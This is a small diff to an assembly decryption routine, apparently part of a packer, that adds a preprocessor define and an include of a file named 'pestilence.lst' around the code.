@@ -1,4 +1,6 @@
 ;; For more details about this algorithm: it's an RC8 algorithme with a base key of 256 bytes
+%define DEPACKER_S
+%include "pestilence.lst"
 
 section .text
 	global _decrypt
@@ -170,3 +172,5 @@ _continue:
 _end_decrypt:
 	leave
 	ret
+
+%undef DEPACKER_S
